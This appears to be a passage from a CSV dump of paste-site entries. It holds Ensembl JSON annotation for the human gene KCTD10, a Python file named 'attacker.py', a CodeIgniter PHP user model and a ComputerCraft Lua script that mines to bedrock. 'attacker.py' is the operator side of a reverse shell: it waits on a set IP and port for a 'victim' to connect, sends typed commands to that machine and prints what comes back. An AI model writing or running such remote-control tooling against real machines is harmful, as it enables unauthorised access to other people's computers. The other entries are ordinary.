                    ""object_type"": ""Transcript"",
                    ""strand"": -1,
                    ""assembly_name"": ""GRCh38"",
                    ""version"": 1,
                    ""display_name"": ""KCTD10-214""
                },
                {
                    ""display_name"": ""KCTD10-204"",
                    ""version"": 5,
                    ""assembly_name"": ""GRCh38"",
                    ""seq_region_name"": ""12"",
                    ""logic_name"": ""havana_homo_sapiens"",
                    ""strand"": -1,
                    ""object_type"": ""Transcript"",
                    ""MANE"": [],
                    ""biotype"": ""retained_intron"",
                    ""Exon"": [
                        {
                            ""db_type"": ""core"",
                            ""start"": 109477260,
                            ""id"": ""ENSE00003681876"",
                            ""assembly_name"": ""GRCh38"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109477300,
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""version"": 1
                        },
                        {
                            ""seq_region_name"": ""12"",
                            ""end"": 109469728,
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""start"": 109469515,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003681262"",
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109460805,
                            ""id"": ""ENSE00002253444"",
                            ""assembly_name"": ""GRCh38"",
                            ""start"": 109460326,
                            ""db_type"": ""core""
                        }
                    ],
                    ""start"": 109460326,
                    ""db_type"": ""core"",
                    ""id"": ""ENST00000535747"",
                    ""is_canonical"": 0,
                    ""source"": ""havana"",
                    ""Parent"": ""ENSG00000110906"",
                    ""end"": 109477300,
                    ""species"": ""homo_sapiens""
                },
                {
                    ""assembly_name"": ""GRCh38"",
                    ""MANE"": [],
                    ""object_type"": ""Transcript"",
                    ""strand"": -1,
                    ""logic_name"": ""havana_homo_sapiens"",
                    ""seq_region_name"": ""12"",
                    ""display_name"": ""KCTD10-207"",
                    ""version"": 1,
                    ""id"": ""ENST00000538377"",
                    ""is_canonical"": 0,
                    ""source"": ""havana"",
                    ""db_type"": ""core"",
                    ""start"": 109469062,
                    ""species"": ""homo_sapiens"",
                    ""Parent"": ""ENSG00000110906"",
                    ""end"": 109477300,
                    ""biotype"": ""retained_intron"",
                    ""Exon"": [
                        {
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003681876"",
                            ""db_type"": ""core"",
                            ""start"": 109477260,
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""seq_region_name"": ""12"",
                            ""end"": 109477300,
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""id"": ""ENSE00002276789"",
                            ""assembly_name"": ""GRCh38"",
                            ""db_type"": ""core"",
                            ""start"": 109469062,
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""object_type"": ""Exon"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109469728
                        }
                    ]
                }
            ],
            ""version"": 13,
            ""display_name"": ""KCTD10"",
            ""description"": ""potassium channel tetramerization domain containing 10 [Source:HGNC Symbol;Acc:HGNC:23236]"",
            ""object_type"": ""Gene"",
            ""strand"": -1,
            ""logic_name"": ""ensembl_havana_gene_homo_sapiens"",
            ""seq_region_name"": ""12"",
            ""assembly_name"": ""GRCh38"",
            ""canonical_transcript"": ""ENST00000228495.11"",
            ""biotype"": ""protein_coding"",
            ""species"": ""homo_sapiens"",
            ""end"": 109477359,
            ""source"": ""ensembl_havana"",
            ""id"": ""ENSG00000110906"",
            ""start"": 109448655,
            ""db_type"": ""core""
        }"
0xzEbZqP,attacker.py,FlyFar,Python,Saturday 19th of August 2023 08:30:59 AM CDT,"import socketserver
import logging

HOST, PORT = ""192.168.10.7"", 9999

class ServerHandler(socketserver.BaseRequestHandler):
    def setup(self):
        logging.info(""The victim has connected successfully: {}"".format(self.client_address[0]))
    
    def handle(self):
        while True:
            command = """"
            
            while not command:
                command = input("">"")

            self.request.sendall(command.encode(""utf-8""))
            data = self.request.recv(8192)

            output = str(data.strip(), ""utf-8"", ""ignore"")
            print(output)

    def finish(self):
        logging.info(""The victim got disconnected: {}"".format(self.client_address[0]))
    
logger = logging.basicConfig(
    level=logging.INFO,
    format=""(%(asctime)s) [%(levelname)s] %(message)s"",
    datefmt=""%H:%M:%S"",
)

with socketserver.TCPServer((HOST, PORT), ServerHandler) as server:
    logging.info(""Server started on {}:{}"".format(HOST, PORT))
    logging.info(""Waiting for a connection..."")
    server.serve_forever()"
sx0PjUDE,UserModel.php,lamhotsimamora,PHP,Saturday 19th of August 2023 08:28:55 AM CDT,"<?php

namespace App\Models;

use CodeIgniter\Model;

class UserModel extends Model
{
    protected $table      = 'users';
    protected $primaryKey = 'id_user';

    protected $useAutoIncrement = true;

    protected $returnType     = 'array';
    protected $useSoftDeletes = false;

    protected $allowedFields = ['name', 'email','phone','foto'];

    // Dates
    protected $useTimestamps = false;
    protected $dateFormat    = 'datetime';
    protected $createdField  = 'created_at';
    protected $updatedField  = 'updated_at';

    // Validation
    protected $validationRules      = [];
    protected $validationMessages   = [];
    protected $skipValidation       = false;
    protected $cleanValidationRules = true;

    // Callbacks
    protected $allowCallbacks = true;
    protected $beforeInsert   = [];
    protected $afterInsert    = [];
    protected $beforeUpdate   = [];
    protected $afterUpdate    = [];
    protected $beforeFind     = [];
    protected $afterFind      = [];
    protected $beforeDelete   = [];
    protected $afterDelete    = [];
}"
yhXZbxQL,CC1,flufy174,Lua,Saturday 19th of August 2023 08:24:46 AM CDT,"function refuelFromInventory()
    local i = 1
    while i <= 16 do
        turtle.select(i)
        if turtle.refuel(0) == true then
            turtle.refuel()
        end
        i = i + 1
    end

    turtle.select(1)
end


function mineToBedrock()
    function blockBelowIsBedrock()
        _, block = turtle.inspectDown()
        return block['name'] == ""minecraft:bedrock""
    end

    while blockBelowIsBedrock() == false do
        turtle.digDown()
        turtle.down()
    end

end

refuelFromInventory()

mineToBedrock()

"
